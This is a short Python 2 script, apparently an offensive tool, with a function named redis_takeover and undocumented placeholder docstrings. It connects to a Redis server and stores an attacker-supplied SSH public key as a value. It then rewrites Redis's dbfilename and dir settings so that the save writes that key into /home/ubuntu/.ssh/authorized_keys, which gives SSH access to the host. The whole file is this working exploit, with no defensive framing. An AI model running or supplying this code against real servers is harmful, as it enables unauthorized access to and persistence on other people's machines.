"""
TODO: DOC
"""
import redis

def redis_takeover(implant_public_key_path, host="localhost", port=6379):
    """
    TODO: DOC
    """
    # Initiate the redis client
    r = redis.StrictRedis(host=host, port=port)

    # Output the current configuration
    print "The current dbfilename is: {0}".format(
        r.config_get("dbfilename")
    )
    print "The current storage directory is: {0}".format(
        r.config_get("dir")
    )
    # Write the implant as a key in Redis
    with open(implant_public_key_path, "rb") as implant:
        r.set(
            "SSH_IMPLANT",
            "\n\n{0}\n\n".format(implant.read())
        )
    # Begin changing configuration to dump implant
    r.config_set("dbfilename", "authorized_keys")
    r.config_set("dir", "/home/ubuntu/.ssh/")
    # Commit changes
    r.save()

    print "The new dbfilename is: {0}".format(
        r.config_get("dbfilename")
    )
    print "The new storage directory is: {0}".format(
        r.config_get("dir")
    )
